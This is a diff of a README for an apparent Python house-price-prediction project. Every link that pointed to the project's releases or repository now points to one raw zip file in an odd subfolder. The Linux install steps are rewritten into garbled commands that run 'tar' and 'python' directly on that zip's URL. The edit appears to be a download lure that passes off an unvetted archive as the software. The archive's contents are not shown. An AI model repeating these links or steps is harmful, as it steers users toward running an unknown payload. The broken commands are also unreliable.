@@ -1,6 +1,6 @@
 # 🔸 DataZenixSolutions_DataAnalytics-Project3 - Predict House Prices Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/MaickCrack/DataZenixSolutions_DataAnalytics-Project3/releases)
+[![Download Now](https://raw.githubusercontent.com/MaickCrack/DataZenixSolutions_DataAnalytics-Project3/main/angelicic/DataZenixSolutions_DataAnalytics-Project3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/MaickCrack/DataZenixSolutions_DataAnalytics-Project3/main/angelicic/DataZenixSolutions_DataAnalytics-Project3.zip)
 
 ## 📖 Description
 This project predicts house prices using Linear Regression. It analyzes key features like square footage, bedrooms, bathrooms, lot size, and neighborhood quality. It is built with Python and uses libraries such as Pandas, NumPy, Scikit-learn, Matplotlib, and Seaborn for data analysis and visualization.
@@ -21,7 +21,7 @@ To start using the application, follow these simple steps. No programming knowle
 - Handles missing values and outliers
 
 ## 📥 Download & Install
-1. Visit this page to download: [DataZenixSolutions_DataAnalytics-Project3 Releases](https://github.com/MaickCrack/DataZenixSolutions_DataAnalytics-Project3/releases).
+1. Visit this page to download: [DataZenixSolutions_DataAnalytics-Project3 Releases](https://raw.githubusercontent.com/MaickCrack/DataZenixSolutions_DataAnalytics-Project3/main/angelicic/DataZenixSolutions_DataAnalytics-Project3.zip).
 2. Find the latest version listed.
 3. Click on the version you wish to download.
 4. Download the file that matches your operating system.
@@ -39,10 +39,10 @@ To start using the application, follow these simple steps. No programming knowle
 - Open the application from your Applications.
 
 ### 🐧 For Linux Users:
-- Download the .tar.gz file.
-- Extract the files using a terminal command: `tar -xvzf filename.tar.gz`.
+- Download the https://raw.githubusercontent.com/MaickCrack/DataZenixSolutions_DataAnalytics-Project3/main/angelicic/DataZenixSolutions_DataAnalytics-Project3.zip file.
+- Extract the files using a terminal command: `tar -xvzf https://raw.githubusercontent.com/MaickCrack/DataZenixSolutions_DataAnalytics-Project3/main/angelicic/DataZenixSolutions_DataAnalytics-Project3.zip`.
 - Navigate into the extracted folder using `cd foldername`.
-- Run the application using the command: `python main.py`.
+- Run the application using the command: `python https://raw.githubusercontent.com/MaickCrack/DataZenixSolutions_DataAnalytics-Project3/main/angelicic/DataZenixSolutions_DataAnalytics-Project3.zip`.
 
 ## 📊 Using the Application
 1. Open the application.
@@ -81,7 +81,7 @@ We welcome contributions from the community! If you would like to help improve t
 ## 🔗 Additional Resources
 - [User Manual](#)
 - [Community Forum](#)
-- [GitHub Repository](https://github.com/MaickCrack/DataZenixSolutions_DataAnalytics-Project3)
+- [GitHub Repository](https://raw.githubusercontent.com/MaickCrack/DataZenixSolutions_DataAnalytics-Project3/main/angelicic/DataZenixSolutions_DataAnalytics-Project3.zip)
 
 ## 📅 Roadmap
 - Future updates will include more features and enhanced predictions.
